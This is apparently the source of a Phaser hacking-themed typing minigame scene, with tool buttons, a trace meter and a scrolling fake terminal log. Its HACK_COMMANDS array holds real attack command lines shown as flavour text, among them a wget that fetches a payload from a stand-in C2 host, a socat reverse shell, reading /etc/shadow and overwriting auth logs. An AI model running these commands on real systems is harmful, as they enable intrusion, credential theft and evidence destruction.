import Phaser from 'phaser';

interface HackSceneData {
  targetName: string;
}

interface ToolDef {
  name: string;
  y: number;
}

const LOG_LINES = [
  '> Establishing encrypted tunnel...',
  '> Probing port 22...',
  '> Scanning open services...',
  '> Dictionary attack initialized...',
  '> Enumerating user accounts...',
  '> Bypassing intrusion detection...',
  '> Injecting payload fragments...',
  '> Erasing access logs...',
];

const HACK_COMMANDS = [
  'nmap -sS -p 22,80,443 192.168.1.1',
  'ssh-keygen -t rsa -b 4096 -f ./id_hack',
  'openssl enc -d -aes256 -in payload.bin',
  'hydra -l admin -P rockyou.txt ssh://target',
  'tcpdump -i eth0 -w capture.pcap',
  'curl -s http://target/admin --cookie "auth=1"',
  'john --wordlist=rockyou.txt hashes.txt',
  'nc -lvnp 4444',
  'python3 exploit.py --target 192.168.1.1 --port 22',
  'grep -r "password" /etc/ 2>/dev/null',
  'cat /etc/shadow | cut -d: -f1,2',
  'iptables -A INPUT -p tcp --dport 22 -j DROP',
  'dd if=/dev/urandom of=/var/log/auth.log',
  'ssh -D 9050 -fN root@proxy.onion',
  'proxychains nmap -sT -p- target',
  'hashcat -m 1800 -a 0 hash.txt rockyou.txt',
  'socat TCP:192.168.1.1:443 EXEC:/bin/bash',
  'strace -p $(pgrep sshd) -e trace=read,write',
  'wget -q http://c2.host/payload -O /tmp/.x && chmod +x /tmp/.x',
  'python3 -c "import pty; pty.spawn(\'/bin/bash\')"',
];

const TOOLS: ToolDef[] = [
  { name: 'CRACK PASSWORD', y: 120 },
  { name: 'BYPASS FIREWALL', y: 240 },
  { name: 'WIPE LOGS', y: 360 },
];

// Keystrokes required to complete each tool
const KEYSTROKE_TARGETS = [50, 35, 8];

const BAR_MAX_WIDTH = 340;
const TOOL_PANEL_X = 500;
const COLOR_PRIMARY = 0x4df3a9;
const COLOR_DANGER = 0xff4d4f;
const COLOR_DISABLED_BORDER = 0x2a3a2a;
const COLOR_BG = 0x061012;

// Max narrative log lines (leave one slot below for the live typing line)
const LOG_MAX = 11;

export class HackScene extends Phaser.Scene {
  private targetName = '';
  private trace = 0;
  private traceBarGfx!: Phaser.GameObjects.Graphics;
  private traceText!: Phaser.GameObjects.Text;
  private logTexts: Phaser.GameObjects.Text[] = [];
  private logLineIndex = 0;
  private shuffledLogLines: string[] = [];

  private toolStates: { done: boolean; running: boolean; enabled: boolean }[] = [];
  private toolBorderGfx: Phaser.GameObjects.Graphics[] = [];
  private toolProgressGfx: Phaser.GameObjects.Graphics[] = [];
  private toolLabels: Phaser.GameObjects.Text[] = [];
  private toolZones: Phaser.GameObjects.Zone[] = [];

  // Typing mechanic state
  private activeToolIndex: number | null = null;
  private lastKeypressTime = 0;
  private toolProgress: number[] = [];
  private shuffledCommands: string[] = [];
  private corpusIndex = 0;
  private corpusCharIndex = 0;
  private typingLineText: Phaser.GameObjects.Text | null = null;
  private idleTraceAccumulator = 0;

  constructor() {
    super({ key: 'HackScene' });
  }

  init(data: HackSceneData): void {
    this.targetName = data.targetName;
    this.trace = 0;
    this.logTexts = [];
    this.logLineIndex = 0;
    this.shuffledLogLines = [...LOG_LINES].sort(() => Math.random() - 0.5);
    this.toolStates = TOOLS.map((_, i) => ({ done: false, running: false, enabled: i === 0 }));
    this.toolBorderGfx = [];
    this.toolProgressGfx = [];
    this.toolLabels = [];
    this.toolZones = [];

    this.activeToolIndex = null;
    this.lastKeypressTime = 0;
    this.toolProgress = [0, 0, 0];
    this.shuffledCommands = [...HACK_COMMANDS].sort(() => Math.random() - 0.5);
    this.corpusIndex = 0;
    this.corpusCharIndex = 0;
    this.typingLineText = null;
    this.idleTraceAccumulator = 0;
  }

  create(): void {
    // Grid background
    const grid = this.add.graphics();
    grid.lineStyle(1, 0x1a3a2a, 0.15);
    for (let x = 0; x <= 900; x += 45) {
      grid.beginPath(); grid.moveTo(x, 0); grid.lineTo(x, 560); grid.strokePath();
    }
    for (let y = 0; y <= 560; y += 45) {
      grid.beginPath(); grid.moveTo(0, y); grid.lineTo(900, y); grid.strokePath();
    }

    // Top bar
    const topBar = this.add.graphics();
    topBar.fillStyle(0x010608, 1);
    topBar.fillRect(0, 0, 900, 40);
    topBar.lineStyle(1, 0x4df3a9, 0.15);
    topBar.strokeRect(0, 0, 900, 40);

    this.add.text(12, 10, `TARGET: ${this.targetName}`, {
      fontFamily: 'monospace', fontSize: '13px', color: '#4df3a9',
    });

    this.traceBarGfx = this.add.graphics();
    this.traceText = this.add.text(888, 10, 'TRACE:  0%', {
      fontFamily: 'monospace', fontSize: '12px', color: '#4df3a9',
    }).setOrigin(1, 0);
    this.updateTraceBar();

    // Trace timer: +1% per second
    this.time.addEvent({
      delay: 1000,
      repeat: 99,
      callback: () => {
        this.trace = Math.min(100, this.trace + 1);
        this.updateTraceBar();
        if (this.trace >= 100) {
          this.scene.start('MissionEndScene', { success: false, trace: 100 });
        }
      },
    });

    // Left log panel
    const logBg = this.add.graphics();
    logBg.fillStyle(0x010608, 0.85);
    logBg.fillRect(20, 50, 460, 480);
    this.add.text(28, 58, '// SYSTEM LOG', {
      fontFamily: 'monospace', fontSize: '10px', color: '#2a6a4a',
    });

    this.time.addEvent({ delay: 2500, repeat: -1, callback: () => this.addLogLine() });
    this.addLogLine();

    // Right tool panel
    const toolBg = this.add.graphics();
    toolBg.fillStyle(0x010608, 0.85);
    toolBg.fillRect(TOOL_PANEL_X, 50, 380, 480);
    toolBg.lineStyle(1, 0x2a5a3a, 0.3);
    toolBg.strokeRect(TOOL_PANEL_X, 50, 380, 480);

    const scanLine = this.add.graphics();
    scanLine.fillStyle(0x4df3a9, 0.04);
    scanLine.fillRect(0, 0, 900, 4);
    this.tweens.add({ targets: scanLine, y: 560, duration: 5200, repeat: -1, ease: 'Linear' });

    this.add.text(TOOL_PANEL_X + 8, 58, '// TOOLS', {
      fontFamily: 'monospace', fontSize: '10px', color: '#2a6a4a',
    });

    for (let i = 0; i < TOOLS.length; i++) {
      this.createToolButton(i);
    }

    // Keyboard capture
    this.input.keyboard!.on('keydown', this.onKeyDown, this);
  }

  update(_time: number, delta: number): void {
    const i = this.activeToolIndex;
    if (i === null || !this.toolStates[i].running) return;

    const idleMs = Date.now() - this.lastKeypressTime;
    if (idleMs < 500) return;

    // Bar decay: 3% per second while idle
    this.toolProgress[i] = Math.max(0, this.toolProgress[i] - delta * 0.003);
    this.drawTypingProgress(i);

    // Extra trace tick: +1% per second on top of the regular timer
    this.idleTraceAccumulator += delta;
    if (this.idleTraceAccumulator >= 1000) {
      this.idleTraceAccumulator -= 1000;
      this.trace = Math.min(100, this.trace + 1);
      this.updateTraceBar();
      if (this.trace >= 100) {
        this.scene.start('MissionEndScene', { success: false, trace: 100 });
      }
    }
  }

  private onKeyDown(): void {
    const i = this.activeToolIndex;
    if (i === null) return;
    const state = this.toolStates[i];
    if (!state.running || state.done) return;

    this.lastKeypressTime = Date.now();
    this.idleTraceAccumulator = 0;

    // Random progress per keypress (base ± 30% variance)
    const base = 100 / KEYSTROKE_TARGETS[i];
    const increment = base * (0.7 + Math.random() * 0.6);
    this.toolProgress[i] = Math.min(100, this.toolProgress[i] + increment);

    // Reveal 1–3 chars (random burst)
    const charCount = Math.floor(Math.random() * 3) + 1;
    this.revealCorpusChars(charCount);

    this.drawTypingProgress(i);

    if (this.toolProgress[i] >= 100) {
      this.completeActiveTool();
    }
  }

  private revealCorpusChars(count: number): void {
    for (let n = 0; n < count; n++) {
      const cmd = this.shuffledCommands[this.corpusIndex % this.shuffledCommands.length];

      if (this.corpusCharIndex >= cmd.length) {
        // Command complete — graduate typing line into the log array
        this.finalizeTypingLine();
        this.corpusIndex++;
        this.corpusCharIndex = 0;
        continue;
      }

      if (!this.typingLineText) {
        // Start a new live typing line below the current log entries
        const yPos = 75 + Math.min(this.logTexts.length, LOG_MAX) * 18;
        this.typingLineText = this.add.text(28, yPos, '', {
          fontFamily: 'monospace', fontSize: '11px', color: '#53d1ff',
        });
      }

      this.typingLineText.setText('> ' + cmd.slice(0, this.corpusCharIndex + 1));
      this.corpusCharIndex++;
    }
  }

  private finalizeTypingLine(): void {
    if (!this.typingLineText) return;
    if (this.logTexts.length >= LOG_MAX) {
      const oldest = this.logTexts.shift();
      oldest?.destroy();
      for (const t of this.logTexts) t.y -= 18;
    }
    this.typingLineText.setY(75 + this.logTexts.length * 18);
    this.logTexts.push(this.typingLineText);
    this.typingLineText = null;
  }

  private drawTypingProgress(index: number): void {
    const tool = TOOLS[index];
    const startX = TOOL_PANEL_X + 20;
    const progY = tool.y + 55;
    const progH = 8;
    const val = (this.toolProgress[index] / 100) * (BAR_MAX_WIDTH - 20);

    const progGfx = this.toolProgressGfx[index];
    progGfx.clear();
    if (val <= 0) return;

    progGfx.fillStyle(COLOR_PRIMARY, 0.75);
    progGfx.fillRect(startX, progY, val, progH);
    // Leading-edge glow
    progGfx.fillStyle(COLOR_PRIMARY, 0.35);
    progGfx.fillRect(startX + val - 6, progY - 2, 10, progH + 4);
    progGfx.fillStyle(0xffffff, 0.18);
    progGfx.fillRect(startX + val - 1, progY, 3, progH);
  }

  private completeActiveTool(): void {
    const index = this.activeToolIndex!;
    this.activeToolIndex = null;

    // Finalize any partial typing line
    this.finalizeTypingLine();

    const state = this.toolStates[index];
    state.running = false;
    state.done = true;

    this.toolLabels[index].setText(`[DONE \u2713]`);
    this.toolLabels[index].setColor('#4df3a9');

    const tool = TOOLS[index];
    const startX = TOOL_PANEL_X + 20;
    const progGfx = this.toolProgressGfx[index];
    progGfx.clear();
    progGfx.fillStyle(COLOR_PRIMARY, 0.9);
    progGfx.fillRect(startX, tool.y + 55, BAR_MAX_WIDTH - 20, 8);

    const next = index + 1;
    if (next < TOOLS.length) {
      this.toolStates[next].enabled = true;
      this.toolLabels[next].setColor('#4df3a9');
      this.drawToolButton(next, 0);
      this.toolZones[next].setInteractive({ useHandCursor: true });
    }

    if (this.toolStates.every((s) => s.done)) {
      this.onAllToolsDone();
    }
  }

  private updateTraceBar(): void {
    this.traceBarGfx.clear();
    const barW = Math.floor((this.trace / 100) * 160);
    const color = this.trace > 70 ? COLOR_DANGER : COLOR_PRIMARY;
    this.traceBarGfx.fillStyle(color, 0.9);
    this.traceBarGfx.fillRect(710, 14, barW, 12);
    const pct = String(this.trace).padStart(3, ' ');
    this.traceText.setText(`TRACE: ${pct}%`);
    this.traceText.setColor(this.trace > 70 ? '#ff4d4f' : '#4df3a9');
  }

  private addLogLine(): void {
    const line = this.shuffledLogLines[this.logLineIndex % this.shuffledLogLines.length];
    this.logLineIndex++;

    if (this.logTexts.length >= LOG_MAX) {
      const oldest = this.logTexts.shift();
      oldest?.destroy();
      for (const t of this.logTexts) t.y -= 18;
    }

    const yPos = 75 + this.logTexts.length * 18;
    const txt = this.add.text(28, yPos, line, {
      fontFamily: 'monospace', fontSize: '11px', color: '#4df3a9',
    });
    this.logTexts.push(txt);

    // Keep live typing line below log entries
    if (this.typingLineText) {
      this.typingLineText.setY(75 + this.logTexts.length * 18);
    }
  }

  private createToolButton(index: number): void {
    const tool = TOOLS[index];
    const bx = TOOL_PANEL_X + 10;
    const by = tool.y;
    const bw = 360;
    const bh = 80;

    this.toolBorderGfx.push(this.add.graphics());
    this.toolProgressGfx.push(this.add.graphics());
    this.drawToolButton(index, 0);

    const label = this.add.text(bx + bw / 2, by + 28, `[${tool.name}]`, {
      fontFamily: 'monospace', fontSize: '13px',
      color: index === 0 ? '#4df3a9' : '#2a4a2a',
    }).setOrigin(0.5, 0.5);
    this.toolLabels.push(label);

    const zone = this.add.zone(bx + bw / 2, by + bh / 2, bw, bh).setInteractive({ useHandCursor: true });
    this.toolZones.push(zone);

    zone.on('pointerdown', () => {
      const state = this.toolStates[index];
      if (!state.enabled || state.running || state.done) return;

      state.running = true;
      this.activeToolIndex = index;
      this.lastKeypressTime = Date.now(); // grace period before decay
      this.toolProgress[index] = 0;

      label.setText('[TYPE TO HACK...]');
      label.setColor('#53d1ff');
      zone.disableInteractive();
    });

    zone.on('pointerover', () => {
      const state = this.toolStates[index];
      if (state.enabled && !state.running && !state.done) this.drawToolButton(index, 1);
    });

    zone.on('pointerout', () => this.drawToolButton(index, 0));
  }

  private drawToolButton(index: number, hover: number): void {
    const tool = TOOLS[index];
    const state = this.toolStates[index];
    const bx = TOOL_PANEL_X + 10;
    const by = tool.y;
    const bw = 360;
    const bh = 80;
    const gfx = this.toolBorderGfx[index];

    gfx.clear();
    const borderColor = state.enabled ? (hover ? 0x53d1ff : COLOR_PRIMARY) : COLOR_DISABLED_BORDER;
    const alpha = state.enabled ? (hover ? 0.15 : 0.08) : 0.05;
    gfx.fillStyle(COLOR_BG, 1);
    gfx.fillRect(bx, by, bw, bh);
    gfx.lineStyle(1, borderColor, 1);
    gfx.strokeRect(bx, by, bw, bh);
    if (hover && state.enabled) {
      gfx.fillStyle(COLOR_PRIMARY, alpha);
      gfx.fillRect(bx, by, bw, bh);
    }
  }

  private onAllToolsDone(): void {
    const flash = this.add.text(450, 280, 'CONNECTION ESTABLISHED', {
      fontFamily: 'monospace', fontSize: '22px', color: '#4df3a9',
    }).setOrigin(0.5, 0.5).setAlpha(0);

    this.tweens.add({
      targets: flash,
      alpha: 1,
      duration: 300,
      yoyo: true,
      repeat: 3,
      onComplete: () => {
        this.scene.start('MissionEndScene', { success: true, trace: this.trace });
      },
    });
  }
}
